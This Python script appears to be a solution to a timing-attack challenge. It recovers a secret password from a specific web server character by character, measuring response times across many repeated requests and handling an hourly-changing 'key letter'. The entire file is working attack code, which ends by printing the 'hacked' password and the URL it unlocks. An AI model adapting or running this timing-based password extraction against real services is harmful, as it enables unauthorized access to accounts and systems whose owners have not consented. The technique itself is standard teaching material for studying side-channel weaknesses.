from statistics import mean
import requests
import time
from datetime import datetime, timedelta

URL = "https://barfishilev.pythonanywhere.com/"
REPEAT_CHECK = 8
POOL = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
# Alternative smaller pool for testing:
# POOL = 'aopqsAPTU16790'
PADDING_LENGTH = 12
MAX_PASSWORD_LENGTH = 6

last_day = -1
last_hour = -1
current_letter = ''

def timeit(url2check,  repeat=1):
    """
    Measures the average response time for a given URL over a number of requests.
    
    :param url2check: (str) The URL to check.
    :param repeat: (int) The number of times to repeat the request.
    :return: (float) The average response time after removing outliers.
    """
    times = []
    for _ in range(repeat):
        start = time.time()
        r = requests.get(url2check, allow_redirects=True)
        end = time.time()
        times.append(end - start)

    removed = remove_4(times)
    if repeat > 15:
        removed = remove_4(removed)

    return mean(removed)


def remove_4(times):
    """
    Removes the two highest and two lowest values from the list.
    
    :param times: (list) List of timing values.
    :return: (list) The list after removing the outliers.
    """
    times.sort()
    times.pop(0)
    times.pop(0)
    times.pop(-1)
    times.pop(-1)
    return times


def find_cur_letter(url, pool, padding_length):
    """
    Finds the current key letter by measuring response times of every char
    in the pool. The char with the lowest response time is the key letter.
    If no char shows a significant time difference, the 4 lowest are retested.
    
    :param url: (str) The base URL to test.
    :param pool: (str) The pool of characters to test.
    :param padding_length: (int) The length of the padding to use.
    :return: (char) The current key letter.
    """
    wrong_time = timeit(url + '*' * padding_length, REPEAT_CHECK)
    timings = {}
    for ch in pool:
        last_key_letter = current_letter
        check_hour_change()
        if last_key_letter != current_letter:
            return current_letter
        
        test_url = url + ch * padding_length
        t = timeit(test_url, REPEAT_CHECK)
        timings[ch] = t
        print(f'KEY: {ch} | TIME: {t}')
        if wrong_time - t > 0.4:
            print('=========================')
            print(f'KEY FOUND: {ch}')
            print('=========================')
            return ch

    sorted_timings = sorted(timings.items(), key=lambda x: x[1])
    lowest_time_chars = {}
    print('=========================')
    print('Checking 4 lowest keys...')
    for i in range(4):
        last_key_letter = current_letter
        check_hour_change()
        if last_key_letter != current_letter:
            return current_letter
        
        test_url = url + sorted_timings[i][0] * padding_length
        t = timeit(test_url, REPEAT_CHECK + 5)
        lowest_time_chars[sorted_timings[i][0]] = t
        print(f'KEY: {sorted_timings[i][0]} | TIME: {t}')
    
    sorted_timings = sorted(lowest_time_chars.items(), key=lambda x: x[1])
    print('=========================')
    print(f'KEY FOUND: {sorted_timings[0][0]}')
    print('=========================')
    return sorted_timings[0][0]


def check_hour_change():
    global last_day, last_hour, current_letter

    now = datetime.now()

    if now.minute >= 58:
        print(f"Hour will change in ~2 minutes. Waiting...")
        time.sleep(120)
        now = datetime.now()

    day = now.day
    hour = now.hour

    if hour != last_hour or day != last_day:
        last_day = day
        last_hour = hour

        print('=========================')
        print('Hour/Day changed, finding new key letter...')
        current_letter = find_cur_letter(URL, POOL, PADDING_LENGTH)
        

def hack_password(url, pool, max_length, padding_length):
    """
    Hacks the password by finding the key letter and then finding each character
    one by one using timing attacks, by replacing the key letter at the current position
    with each character from the pool.
    If there is no significant timing difference for a character, 
    it retests the 4 lowest candidates.
    If the hour changes during the process, it updates the key letter.
    
    :param url: (str) The base URL to test.
    :param pool: (str) The pool of characters to test.
    :param max_length: (int) The maximum length of the password.
    :param padding_length: (int) The length of the padding to use.
    :return: (str) The hacked password.
    """
    password = []
    possible_chars = ' ' + pool

    for i in range(max_length):
        timings = {}

        check_hour_change()
        test_wrong_pass = [current_letter] * padding_length
        test_wrong_pass[i + max_length] = '*'
        test_wrong_url = url + ''.join(test_wrong_pass)
        wrong_time = timeit(test_wrong_url, 20)

        cur_letter_time = 0.0

        for ch in possible_chars:
            check_hour_change()

            test_pass = [current_letter] * padding_length
            test_pass[i + max_length] = ch
            test_url = url + ''.join(test_pass)
            t = timeit(test_url, REPEAT_CHECK)
            print(f'POS: {i} | CHAR: {ch} | TIME: {t}')

            if ch == current_letter:
                cur_letter_time = t
                continue
                
            if wrong_time - t > 0.2:
                print('=============================')
                print(f'CHAR FOUND: {ch} | AT POS {i}')
                password.append(ch)
                print(f"CURRENT PASSWORD: {''.join(password).strip()}")
                print('=============================')
                break

            timings[ch] = t
        else:
            timings[current_letter] = cur_letter_time
            sorted_timings = sorted(timings.items(), key=lambda x: x[1])
            lowest_time_chars = {}
            print('=============================')
            print('Checking 4 lowest chars...')
            for j in range(4):
                check_hour_change()
                
                test_pass = [current_letter] * padding_length
                test_pass[i + max_length] = sorted_timings[j][0]
                test_url = url + ''.join(test_pass)
                t = timeit(test_url, REPEAT_CHECK + 5)
                lowest_time_chars[sorted_timings[j][0]] = t
                print(f'CHAR: {sorted_timings[j][0]} | TIME: {t}')
            
            sorted_lowest = sorted(lowest_time_chars.items(), key=lambda x: x[1])
            print('=============================')
            print(f'CHAR FOUND: {sorted_lowest[0][0]} | AT POS: {i}')
            password.append(sorted_lowest[0][0])
            print(f"CURRENT PASSWORD: {''.join(password).strip()}")
            print('=============================')
    
    secret_password = ''.join(password).strip()
    print('===========================================')
    print('HACKING COMPLETE!')
    print(f'SECRET PASSWORD FOUND: {secret_password}')
    print(f'URL: {URL}{secret_password}')
    print('===========================================')
    return secret_password


def check_password(url, password):
    """
    Checks if the given password is correct by sending a request to the server.
    '1' indicates a correct password, while '0' indicates an incorrect one.
    
    :param url: (str) The base URL to test.
    :param password: (str) The password to check.
    :return: (bool) True if the password is correct, False otherwise.
    """
    r = requests.get(url + password, allow_redirects=True)
    value = r.text
    return value == '1'

if __name__ == '__main__':
    secret_password = hack_password(URL, POOL, MAX_PASSWORD_LENGTH, PADDING_LENGTH)
    print(f'IS CORRECT: {check_password(URL, secret_password)}')
